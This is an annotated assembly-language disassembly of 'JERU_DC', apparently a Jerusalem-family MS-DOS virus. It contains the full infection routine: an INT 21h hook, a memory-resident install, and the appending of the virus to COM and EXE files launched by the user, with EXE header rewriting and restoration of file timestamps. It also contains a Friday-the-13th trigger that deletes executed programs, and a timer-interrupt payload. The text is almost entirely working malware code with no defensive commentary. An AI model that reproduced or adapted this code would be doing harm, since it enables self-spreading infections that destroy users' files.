﻿


PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        JERU_DC				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   8-Nov-90					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: QRS		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	3FCh			; (0000:03FC=0F000h)
data_2e		equ	3FEh			; (0000:03FE=6)
data_3e		equ	43h			; (3E00:0043=0FFFFh)
data_4e		equ	45h			; (3E00:0045=0FFFFh)
data_5e		equ	47h			; (3E00:0047=0FFFFh)
data_6e		equ	49h			; (3E00:0049=0FFFFh)
data_7e		equ	4Fh			; (3E00:004F=0FFh)
data_8e		equ	51h			; (3E00:0051=0FFFFh)
data_9e		equ	53h			; (3E00:0053=0FFFFh)
data_10e	equ	57h			; (3E00:0057=0FFFFh)
data_11e	equ	5Dh			; (3E00:005D=0FFFFh)
data_12e	equ	5Fh			; (3E00:005F=0FFFFh)
data_13e	equ	61h			; (3E00:0061=0FFFFh)
data_14e	equ	63h			; (3E00:0063=0FFFFh)
data_15e	equ	65h			; (3E00:0065=0FFFFh)
data_16e	equ	78h			; (3E00:0078=0FFFFh)
data_17e	equ	7Ah			; (3E00:007A=0FFFFh)
data_18e	equ	7Ch			; (3E00:007C=0FFFFh)
data_19e	equ	7Eh			; (3E00:007E=0FFFFh)
data_20e	equ	5			; (77C7:0005=0)
data_21e	equ	0Ah			; (77C7:000A=0)
data_23e	equ	0Eh			; (77C7:000E=0)
data_24e	equ	0Fh			; (77C7:000F=0)
data_25e	equ	11h			; (77C7:0011=0)
data_26e	equ	13h			; (77C7:0013=0)
data_28e	equ	17h			; (77C7:0017=0)
data_30e	equ	1Bh			; (77C7:001B=0)
data_32e	equ	1Fh			; (77C7:001F=0)
data_33e	equ	21h			; (77C7:0021=0)
data_34e	equ	23h			; (77C7:0023=0)
data_36e	equ	27h			; (77C7:0027=0)
data_37e	equ	29h			; (77C7:0029=0)
data_38e	equ	2Bh			; (77C7:002B=0)
data_40e	equ	2Dh			; (77C7:002D=0)
data_41e	equ	2Fh			; (77C7:002F=0)
data_42e	equ	31h			; (77C7:0031=77C7h)
data_43e	equ	33h			; (77C7:0033=0)
data_44e	equ	39h			; (77C7:0039=77C7h)
data_45e	equ	3Dh			; (77C7:003D=77C7h)
data_46e	equ	41h			; (77C7:0041=77C7h)
data_47e	equ	43h			; (77C7:0043=0)
data_48e	equ	45h			; (77C7:0045=0)
data_49e	equ	47h			; (77C7:0047=0)
data_51e	equ	4Bh			; (77C7:004B=0)
data_52e	equ	4Dh			; (77C7:004D=0)
data_53e	equ	4Eh			; (77C7:004E=0)
data_54e	equ	6Bh			; (77C7:006B=0)
data_55e	equ	70h			; (77C7:0070=0)
data_56e	equ	72h			; (77C7:0072=0)
data_57e	equ	74h			; (77C7:0074=0)
data_58e	equ	76h			; (77C7:0076=0)
data_59e	equ	7Ah			; (77C7:007A=0)
psp_cmd_size	equ	80h			; (77C7:0080=0)
psp_cmd_tail+1	equ	82h			; (77C7:0082=0C7h)
data_60e	equ	84h			; (77C7:0084=0)
data_61e	equ	8Fh			; (77C7:008F=0)
data_72e	equ	0E943h			; (77C7:E943=0FFFFh)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

jeru_dc		proc	far

start:
		jmp	loc_2			; (0195)
		db	7 dup (20h)
		db	 00h, 01h, 09h, 10h, 00h, 00h
		db	 00h, 00h, 04h,0AAh, 00h,0ECh
		db	 0Ch, 67h, 01h,0B8h, 0Eh, 56h
		db	 05h,0BAh, 0Dh,0ABh, 7Dh, 00h
		db	12 dup (0)
		db	0E8h, 06h, 10h, 8Fh, 0Fh, 80h
		db	 00h, 00h, 00h, 80h, 00h, 8Fh
		db	 0Fh, 5Ch, 00h, 8Fh, 0Fh, 6Ch
		db	 00h, 8Fh, 0Fh, 00h, 10h, 48h
		db	 12h, 47h, 00h, 9Fh, 0Fh, 00h
		db	0F0h, 06h, 00h, 4Dh, 5Ah, 60h
		db	 01h, 1Ah, 00h, 02h, 00h, 20h
		db	 00h, 05h, 01h,0FFh,0FFh,0A5h
		db	 02h, 10h, 07h, 84h, 19h,0C5h
		db	 00h,0A5h, 02h, 1Eh, 00h, 00h
		db	 00h,0CDh, 21h, 00h, 00h, 00h
		db	 05h, 00h, 20h, 00h, 68h, 15h
		db	 6Eh, 80h, 00h, 02h, 10h, 00h
		db	 50h, 2Ch, 00h, 00h,0A9h
		db	'A+{COMMAND.COM'


		db	1, 0, 0, 0, 0, 0
loc_2:						;  xref 77C7:0100
		cld				; Clear direction
		mov	ah,0E0h
		int	21h			; DOS Services  ah=function E0h
		cmp	ah,0E0h
		jae	loc_3			; Jump if above or =
		cmp	ah,3
		jb	loc_3			; Jump if below
		mov	ah,0DDh
		mov	di,offset ds:[100h]	; (77C7:0100=0E9h)
		mov	si,710h
		add	si,di
		mov	cx,cs:[di+11h]
		nop				;*ASM fixup - displacement
		int	21h			; DOS Services  ah=function DDh
loc_3:						;  xref 77C7:019D, 01A2
		mov	ax,cs
		add	ax,10h
		mov	ss,ax
		mov	sp,700h
		push	ax
		mov	ax,0C5h
		push	ax
		retf
		cld				; Clear direction
		push	es
		mov	cs:data_42e,es		; (77C7:0031=77C7h)
		mov	cs:data_44e,es		; (77C7:0039=77C7h)
		mov	cs:data_45e,es		; (77C7:003D=77C7h)
		mov	cs:data_46e,es		; (77C7:0041=77C7h)
		mov	ax,es
		add	ax,10h
		add	word ptr cs:data_49e+2,ax	; (77C7:0049=0)
		add	cs:data_48e,ax		; (77C7:0045=0)
		mov	ah,0E0h
		int	21h			; DOS Services  ah=function E0h
		cmp	ah,0E0h
		jae	loc_4			; Jump if above or =
		cmp	ah,3
		pop	es
		mov	ss,cs:data_48e		; (77C7:0045=0)
		mov	sp,cs:data_47e		; (77C7:0043=0)
		jmp	dword ptr cs:data_49e	; (77C7:0047=0)
loc_4:						;  xref 77C7:01F1
		xor	ax,ax			; Zero register
		mov	es,ax
		mov	ax,es:data_1e		; (0000:03FC=0F000h)
		mov	cs:data_51e,ax		; (77C7:004B=0)
		mov	al,es:data_2e		; (0000:03FE=6)
		mov	cs:data_52e,al		; (77C7:004D=0)

jeru_dc		endp

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;			External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int_24h_entry	proc	far			;  xref 77C7:0534
		mov	word ptr es:[3FCh],0A5F3h	; (77C7:03FC=29h)
		mov	byte ptr es:[3FEh],0CBh	; (77C7:03FE=2Eh)
		pop	ax
		add	ax,10h
		mov	es,ax
		push	cs
		pop	ds
		mov	cx,710h
		shr	cx,1			; Shift w/zeros fill
		xor	si,si			; Zero register
		mov	di,si
		push	es
		mov	ax,142h
		push	ax
;*		jmp	far ptr loc_1		;*(0000:03FC)
		db	0EAh,0FCh, 03h, 00h, 00h
		mov	ax,cs
		mov	ss,ax
		mov	sp,700h
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	ax,cs:data_51e		; (77C7:004B=0)
		mov	ds:data_1e,ax		; (0000:03FC=0F000h)
		mov	al,cs:data_52e		; (77C7:004D=0)
		mov	ds:data_2e,al		; (0000:03FE=6)
int_24h_entry	endp


;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;			External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int_21h_entry	proc	far			;  xref 77C7:0283
		mov	bx,sp
		mov	cl,4
		shr	bx,cl			; Shift w/zeros fill
		add	bx,10h
		mov	cs:data_43e,bx		; (77C7:0033=0)
		mov	ah,4Ah			; 'J'
		mov	es,cs:data_42e		; (77C7:0031=77C7h)
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	cs:data_28e,bx		; (77C7:0017=0)
		mov	word ptr cs:data_28e+2,es	; (77C7:0019=77C7h)
		push	cs
		pop	ds
		mov	dx,offset int_21h_entry
		mov	ax,2521h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	es,ds:data_42e		; (77C7:0031=77C7h)
		mov	es,word ptr es:data_38e+1	; (77C7:002C=0)
		xor	di,di			; Zero register
		mov	cx,7FFFh
		xor	al,al			; Zero register

locloop_5:					;  xref 77C7:02A0
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		cmp	es:[di],al
		loopnz	locloop_5		; Loop if zf=0, cx>0

		mov	dx,di
		add	dx,3
		mov	ax,4B00h
		push	es
		pop	ds
		push	cs
		pop	es
		mov	bx,35h
		push	ds
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		mov	byte ptr cs:data_23e,0	; (77C7:000E=0)
		cmp	cx,7C3h
		je	loc_7			; Jump if equal
		cmp	al,5
		jne	loc_6			; Jump if not equal
		cmp	dl,0Dh
		jne	loc_6			; Jump if not equal
		inc	byte ptr cs:data_23e	; (77C7:000E=0)
		jmp	short loc_7		; (02F7)
		db	90h
loc_6:						;  xref 77C7:02C9, 02CE
		mov	ax,3508h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	cs:data_26e,bx		; (77C7:0013=0)
		mov	word ptr cs:data_26e+2,es	; (77C7:0015=77C7h)
		push	cs
		pop	ds
		mov	word ptr ds:data_32e,7E90h	; (77C7:001F=0)
		mov	ax,2508h
		mov	dx,offset int_08h_entry
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
loc_7:						;  xref 77C7:02C5, 02D5
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
		pushf				; Push flags
		call	dword ptr cs:data_28e	; (77C7:0017=0)
		push	ds
		pop	es
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	ah,4Dh			; 'M'
		int	21h			; DOS Services  ah=function 4Dh
						;  get return code info in ax
		mov	ah,31h			; '1'
		mov	dx,600h
		mov	cl,4
		shr	dx,cl			; Shift w/zeros fill
		add	dx,10h
		int	21h			; DOS Services  ah=function 31h
						;  terminate & stay resident
		xor	al,al			; Zero register
		iret				; Interrupt return
int_21h_entry	endp

		db	 2Eh, 83h, 3Eh, 1Fh, 00h, 02h
		db	 75h, 17h, 50h, 53h, 51h, 52h
		db	 55h,0B8h, 02h, 06h,0B7h, 87h
		db	0B9h, 05h, 05h,0BAh, 10h, 10h
		db	0CDh, 10h, 5Dh, 5Ah, 59h, 5Bh
		db	 58h, 2Eh,0FFh, 0Eh, 1Fh, 00h
		db	 75h, 12h, 2Eh,0C7h, 06h, 1Fh
		db	 00h, 01h, 00h, 50h, 51h, 56h
		db	0B9h, 01h, 40h,0F3h,0ACh
		db	 5Eh, 59h, 58h
loc_8:
		jmp	dword ptr cs:data_26e	; (77C7:0013=0)
		pushf				; Push flags
		cmp	ah,0E0h
		jne	loc_9			; Jump if not equal
		mov	ax,300h
		popf				; Pop flags
		iret				; Interrupt return
loc_9:						;  xref 77C7:035F
		cmp	ah,0DDh
		je	loc_11			; Jump if equal
		cmp	ah,0DEh
		je	loc_12			; Jump if equal
		cmp	ax,4B00h
		jne	loc_10			; Jump if not equal
		jmp	loc_16			; (042C)
loc_10:						;  xref 77C7:0373
		popf				; Pop flags
		jmp	dword ptr cs:data_28e	; (77C7:0017=0)
loc_11:						;  xref 77C7:0369
		pop	ax
		pop	ax
		mov	ax,100h
		mov	cs:data_21e,ax		; (77C7:000A=0)
		pop	ax
		mov	word ptr cs:data_21e+2,ax	; (77C7:000C=0)
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		popf				; Pop flags
		mov	ax,cs:data_24e		; (77C7:000F=0)
		jmp	dword ptr cs:data_21e	; (77C7:000A=0)
loc_12:						;  xref 77C7:036E
		add	sp,6
		popf				; Pop flags
		mov	ax,cs
		mov	ss,ax
		mov	sp,710h
		push	es
		push	es
		xor	di,di			; Zero register
		push	cs
		pop	es
		mov	cx,10h
		mov	si,bx
		mov	di,data_33e		; (77C7:0021=0)
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,ds
		mov	es,ax
		mul	word ptr cs:data_59e	; (77C7:007A=0) ax = data * ax
		add	ax,cs:data_38e		; (77C7:002B=0)
		adc	dx,0
		div	word ptr cs:data_59e	; (77C7:007A=0) ax,dxrem=dx:ax/data
		mov	ds,ax
		mov	si,dx
		mov	di,dx
		mov	bp,es
		mov	bx,cs:data_41e		; (77C7:002F=0)
		or	bx,bx			; Zero ?
		jz	loc_14			; Jump if zero
loc_13:						;  xref 77C7:03EB
		mov	cx,8000h
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		add	ax,1000h
		add	bp,1000h
		mov	ds,ax
		mov	es,bp
		dec	bx
		jnz	loc_13			; Jump if not zero
loc_14:						;  xref 77C7:03D8
		mov	cx,cs:data_40e		; (77C7:002D=0)
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	ax
		push	ax
		add	ax,10h
		add	cs:data_37e,ax		; (77C7:0029=0)
		add	word ptr cs:data_34e+2,ax	; (77C7:0025=0)
		mov	ax,cs:data_33e		; (77C7:0021=0)
		pop	ds
		pop	es
		mov	ss,cs:data_37e		; (77C7:0029=0)
		mov	sp,cs:data_36e		; (77C7:0027=0)
		jmp	dword ptr cs:data_34e	; (77C7:0023=0)
loc_15:						;  xref 77C7:0432
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	ah,41h			; 'A'
		int	21h			; DOS Services  ah=function 41h
						;  delete file, name @ ds:dx
		mov	ax,4B00h
		popf				; Pop flags
		jmp	dword ptr cs:data_28e	; (77C7:0017=0)
loc_16:						;  xref 77C7:0375
		cmp	byte ptr cs:data_23e,1	; (77C7:000E=0)
		je	loc_15			; Jump if equal
		mov	word ptr cs:data_55e,0FFFFh	; (77C7:0070=0)
		mov	word ptr cs:data_61e,0	; (77C7:008F=0)
		mov	cs:psp_cmd_size,dx	; (77C7:0080=0)
		mov	cs:psp_cmd_tail+1,ds	; (77C7:0082=77C7h)
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		cld				; Clear direction
		mov	di,dx
		xor	dl,dl			; Zero register
		cmp	byte ptr [di+1],3Ah	; ':'
		jne	loc_17			; Jump if not equal
		mov	dl,[di]
		and	dl,1Fh
loc_17:						;  xref 77C7:045D
		mov	ah,36h			; '6'
		int	21h			; DOS Services  ah=function 36h
						;  get free space, drive dl,1=a:
		cmp	ax,0FFFFh
		jne	loc_19			; Jump if not equal
loc_18:						;  xref 77C7:047B
		jmp	loc_45			; (06E7)
loc_19:						;  xref 77C7:046B
		mul	bx			; dx:ax = reg * ax
		mul	cx			; dx:ax = reg * ax
		or	dx,dx			; Zero ?
		jnz	loc_20			; Jump if not zero
		cmp	ax,710h
		jb	loc_18			; Jump if below
loc_20:						;  xref 77C7:0476
		mov	dx,cs:psp_cmd_size	; (77C7:0080=0)
		push	ds
		pop	es
		xor	al,al			; Zero register
		mov	cx,41h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	si,cs:psp_cmd_size	; (77C7:0080=0)
loc_21:						;  xref 77C7:04A2
		mov	al,[si]
		or	al,al			; Zero ?
		jz	loc_23			; Jump if zero
		cmp	al,61h			; 'a'
		jb	loc_22			; Jump if below
		cmp	al,7Ah			; 'z'
		ja	loc_22			; Jump if above
		sub	byte ptr [si],20h	; ' '
loc_22:						;  xref 77C7:0498, 049C
		inc	si
		jmp	short loc_21		; (0490)
loc_23:						;  xref 77C7:0494
		mov	cx,0Bh
		sub	si,cx
		mov	di,data_60e		; (77C7:0084=0)
		push	cs
		pop	es
		mov	cx,0Bh
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_24			; Jump if not zero
		jmp	loc_45			; (06E7)
loc_24:						;  xref 77C7:04B3
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		jc	loc_25			; Jump if carry Set
		mov	cs:data_56e,cx		; (77C7:0072=0)
loc_25:						;  xref 77C7:04BD
		jc	loc_27			; Jump if carry Set
		xor	al,al			; Zero register
		mov	cs:data_53e,al		; (77C7:004E=0)
		push	ds
		pop	es
		mov	di,dx
		mov	cx,41h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		cmp	byte ptr [di-2],4Dh	; 'M'
		je	loc_26			; Jump if equal
		cmp	byte ptr [di-2],6Dh	; 'm'
		je	loc_26			; Jump if equal
		inc	byte ptr cs:data_53e	; (77C7:004E=0)
loc_26:						;  xref 77C7:04D9, 04DF
		mov	ax,3D00h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
loc_27:						;  xref 77C7:04C4, 04FE
		jc	loc_29			; Jump if carry Set
		mov	cs:data_55e,ax		; (77C7:0070=0)
		mov	bx,ax
		mov	ax,4202h
		mov	cx,0FFFFh
		mov	dx,0FFFBh
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_27			; Jump if carry Set
		add	ax,5
		mov	cs:data_25e,ax		; (77C7:0011=0)
		mov	cx,5
		mov	dx,data_54e		; (77C7:006B=0)
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		mov	di,dx
		mov	si,data_20e		; (77C7:0005=0)
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_28			; Jump if not zero
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_45			; (06E7)
loc_28:						;  xref 77C7:051E
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_30e,bx		; (77C7:001B=0)
		mov	word ptr ds:data_30e+2,es	; (77C7:001D=77C7h)
		mov	dx,offset int_24h_entry
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		lds	dx,dword ptr ds:psp_cmd_size	; (77C7:0080=0) Load 32 bit ptr
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_29:						;  xref 77C7:04EB
		jc	loc_30			; Jump if carry Set
		mov	bx,cs:data_55e		; (77C7:0070=0)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	word ptr cs:data_55e,0FFFFh	; (77C7:0070=0)
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_30			; Jump if carry Set
		mov	cs:data_55e,ax		; (77C7:0070=0)
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	bx,ds:data_55e		; (77C7:0070=0)
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ds:data_57e,dx		; (77C7:0074=0)
		mov	ds:data_58e,cx		; (77C7:0076=0)
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_30:						;  xref 77C7:0547, 055E
		jc	loc_33			; Jump if carry Set
		cmp	byte ptr ds:data_53e,0	; (77C7:004E=0)
		je	loc_31			; Jump if equal
		jmp	short loc_35		; (05E6)
		db	90h
loc_31:						;  xref 77C7:058B
		mov	bx,1000h
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		jnc	loc_32			; Jump if carry=0
		mov	ah,3Eh			; '>'
		mov	bx,ds:data_55e		; (77C7:0070=0)
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_45			; (06E7)
loc_32:						;  xref 77C7:0597
		inc	word ptr ds:data_61e	; (77C7:008F=0)
		mov	es,ax
		xor	si,si			; Zero register
		mov	di,si
		mov	cx,710h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	dx,di
		mov	cx,ds:data_25e		; (77C7:0011=0)
		mov	bx,ds:data_55e		; (77C7:0070=0)
		push	es
		pop	ds
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
loc_33:						;  xref 77C7:0584
		jc	loc_34			; Jump if carry Set
		add	di,cx
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	si,data_20e		; (77C7:0005=0)
		mov	cx,5
		rep	movs byte ptr es:[di],cs:[si]	; Rep when cx >0 Mov [si] to es:[di]
		mov	cx,di
		xor	dx,dx			; Zero register
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_34:						;  xref 77C7:05C3
		jc	loc_36			; Jump if carry Set
		jmp	loc_43			; (06A2)
loc_35:						;  xref 77C7:058D
		mov	cx,1Ch
		mov	dx,data_7e		; (3E00:004F=0FFh)
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
loc_36:						;  xref 77C7:05E1
		jc	loc_38			; Jump if carry Set
		mov	word ptr ds:data_13e,1984h	; (3E00:0061=0FFFFh)
		mov	ax,ds:data_11e		; (3E00:005D=0FFFFh)
		mov	ds:data_4e,ax		; (3E00:0045=0FFFFh)
		mov	ax,ds:data_12e		; (3E00:005F=0FFFFh)
		mov	ds:data_3e,ax		; (3E00:0043=0FFFFh)
		mov	ax,ds:data_14e		; (3E00:0063=0FFFFh)
		mov	ds:data_5e,ax		; (3E00:0047=0FFFFh)
		mov	ax,ds:data_15e		; (3E00:0065=0FFFFh)
		mov	ds:data_6e,ax		; (3E00:0049=0FFFFh)
		mov	ax,ds:data_9e		; (3E00:0053=0FFFFh)
		cmp	word ptr ds:data_8e,0	; (3E00:0051=0FFFFh)
		je	loc_37			; Jump if equal
		dec	ax
loc_37:						;  xref 77C7:0618
		mul	word ptr ds:data_16e	; (3E00:0078=0FFFFh) ax = data * ax
		add	ax,ds:data_8e		; (3E00:0051=0FFFFh)
		adc	dx,0
		add	ax,0Fh
		adc	dx,0
		and	ax,0FFF0h
		mov	ds:data_18e,ax		; (3E00:007C=0FFFFh)
		mov	ds:data_19e,dx		; (3E00:007E=0FFFFh)
		add	ax,710h
		adc	dx,0
loc_38:						;  xref 77C7:05F0
		jc	loc_40			; Jump if carry Set
		div	word ptr ds:data_16e	; (3E00:0078=0FFFFh) ax,dxrem=dx:ax/da
		or	dx,dx			; Zero ?
		jz	loc_39			; Jump if zero
		inc	ax
loc_39:						;  xref 77C7:0644
		mov	ds:data_9e,ax		; (3E00:0053=0FFFFh)
		mov	ds:data_8e,dx		; (3E00:0051=0FFFFh)
		mov	ax,ds:data_18e		; (3E00:007C=0FFFFh)
		mov	dx,ds:data_19e		; (3E00:007E=0FFFFh)
		div	word ptr ds:data_17e	; (3E00:007A=0FFFFh) ax,dxrem=dx:ax/da
		sub	ax,ds:data_10e		; (3E00:0057=0FFFFh)
		mov	ds:data_15e,ax		; (3E00:0065=0FFFFh)
		mov	word ptr ds:data_14e,0C5h	; (3E00:0063=0FFFFh)
		mov	ds:data_11e,ax		; (3E00:005D=0FFFFh)
		mov	word ptr ds:data_12e,710h	; (3E00:005F=0FFFFh)
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_40:						;  xref 77C7:063C
		jc	loc_41			; Jump if carry Set
		mov	cx,1Ch
		mov	dx,data_7e		; (3E00:004F=0FFh)
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_41:						;  xref 77C7:0678
		jc	loc_42			; Jump if carry Set
		cmp	ax,cx
		jne	loc_43			; Jump if not equal
		mov	dx,ds:data_18e		; (3E00:007C=0FFFFh)
		mov	cx,ds:data_19e		; (3E00:007E=0FFFFh)
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_42:						;  xref 77C7:0684
		jc	loc_43			; Jump if carry Set
		xor	dx,dx			; Zero register
		mov	cx,710h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_43:						;  xref 77C7:05E3, 0688, 0697
		cmp	word ptr cs:data_61e,0	; (77C7:008F=0)
		je	loc_44			; Jump if equal
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
loc_44:						;  xref 77C7:06A8
		cmp	word ptr cs:data_55e,0FFFFh	; (77C7:0070=0)
		je	loc_45			; Jump if equal
		mov	bx,cs:data_55e		; (77C7:0070=0)
		mov	dx,cs:data_57e		; (77C7:0074=0)
		mov	cx,cs:data_58e		; (77C7:0076=0)
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		lds	dx,dword ptr cs:psp_cmd_size	; (77C7:0080=0) Load 32 bit ptr
		mov	cx,cs:data_56e		; (77C7:0072=0)
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		lds	dx,dword ptr cs:data_30e	; (77C7:001B=0) Load 32 bit ptr
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
loc_45:						;  xref 77C7:046D, 04B5, 0524, 05A1
						;            06B4
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf				; Pop flags
		jmp	dword ptr cs:data_28e	; (77C7:0017=0)
		db	11 dup (0)
		db	 4Dh,0BAh, 0Dh, 00h, 10h, 00h
		db	10 dup (0)
		db	0E9h, 92h, 00h
		db	7 dup (20h)
		db	 00h, 01h, 09h, 10h, 00h, 00h
		db	 00h, 00h, 04h,0AAh, 00h,0ECh
		db	 0Ch, 67h, 01h,0B8h, 0Eh, 56h
		db	 05h,0BAh, 0Dh,0ABh, 7Dh, 00h
		db	12 dup (0)
		db	0E8h, 06h, 10h, 8Fh, 0Fh, 80h
		db	 00h, 00h, 00h, 80h, 00h, 8Fh
		db	 0Fh, 5Ch, 00h, 8Fh, 0Fh, 6Ch
		db	 00h, 8Fh, 0Fh, 00h, 10h, 48h
		db	 12h, 47h, 00h, 9Fh, 0Fh, 00h
		db	0F0h, 06h, 00h, 4Dh, 5Ah, 60h
		db	 01h, 1Ah, 00h, 02h, 00h, 20h
		db	 00h, 05h, 01h,0FFh,0FFh,0A5h
		db	 02h, 10h, 07h, 84h, 19h,0C5h
		db	 00h,0A5h, 02h, 1Eh, 00h, 00h
		db	 00h,0CDh, 21h, 00h, 00h, 00h
		db	 05h, 00h, 20h, 00h, 68h, 15h
		db	 6Eh, 80h, 00h, 02h, 10h, 00h
		db	 50h, 2Ch, 00h, 00h,0A9h
		db	'A+{COMMAND.COM'


		db	 01h, 00h, 00h, 00h, 00h, 00h
		db	0FCh,0B4h,0E0h,0CDh, 21h, 80h
		db	0FCh,0E0h, 73h, 16h, 80h,0FCh
		db	 03h, 72h, 11h,0B4h,0DDh,0BFh
		db	 00h, 01h,0BEh, 10h, 07h, 03h
		db	0F7h, 2Eh, 8Bh, 8Dh, 11h, 00h
		db	0CDh
		db	21h
loc_46:
		mov	ax,cs
		add	ax,10h
		mov	ss,ax
		mov	sp,700h
		push	ax
		mov	ax,0C5h
		push	ax
		retf
		cld				; Clear direction
		push	es
